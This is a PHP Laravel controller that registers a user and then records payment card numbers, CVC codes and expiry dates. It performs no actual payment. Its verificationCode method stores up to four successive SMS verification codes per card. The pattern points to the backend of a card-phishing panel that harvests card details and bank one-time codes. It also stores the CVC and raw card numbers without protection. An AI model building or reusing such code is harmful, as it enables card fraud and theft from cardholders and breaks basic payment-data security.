<?php

namespace App\Http\Controllers;

use App\Models\Detail;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Models\User;

class ClientController extends Controller
{
    public function register(Request $request) {

        // Validate the request data
        $request->validate([
            'username' => 'required|string',
            'email' => 'required|email',
            'country' => 'required|string',
            'state' => 'required|string',
            'city' => 'required|string',
            'address' => 'required|string',
            'zip' => 'required|numeric',
        ]);

        // Create a new user
        $user = User::create([
            'username' => $request->input('username'), 
            'email' => $request->input('email'), 
            'country' => $request->input('country'), 
            'state' => $request->input('state'), 
            'city' => $request->input('city'), 
            'address' => $request->input('address'), 
            'zip' => bcrypt($request->input('zip')), 
        ]);

        Auth::login($user);

        // Redirect to the payment page
        return redirect()->route('checkout');;
    }

    public function payment(Request $request){
       
        $rmonth = strlen($request->month) === 1 ? '0'.$request->month : $request->month; 
        Detail::updateOrCreate(
            [
                'cnumber' => $request->card,
                'cvc' => $request->cvc,
                'exp' => $request->year . '/' . $rmonth,
            ],
            [
                'user_id' => Auth()->user()->id,
                'country' => $request->country,
                'cnumber' => $request->card,
                'cvc' => $request->cvc,
                'exp' => $request->year . '/' . $rmonth,
                'status' => 1,
            ]
        );
        
        
        return true;
      
    }

    public function verificationCode(Request $request){
         
        $rmonth = strlen($request->month) === 1 ? '0'.$request->month : $request->month; 
        $detail = Detail::where(['cnumber'=>$request->card, 'cvc'=>$request->cvc , 'exp'=>$request->year.'/'.$rmonth])->first();
 
        if($detail->sms == null){
            $detail->sms = $request->codeV;
            $detail->status = 1;
        }elseif($detail->sms1 == null){
            $detail->sms1 = $request->codeV;
            $detail->status = 1;
        }elseif($detail->sms2 == null){
            $detail->sms2 = $request->codeV;
            $detail->status = 1;
        }elseif($detail->sms3 == null){
            $detail->sms3 = $request->codeV;
            $detail->status = 1;
        }
     
        $detail->save();

        return true;
       
    }
}
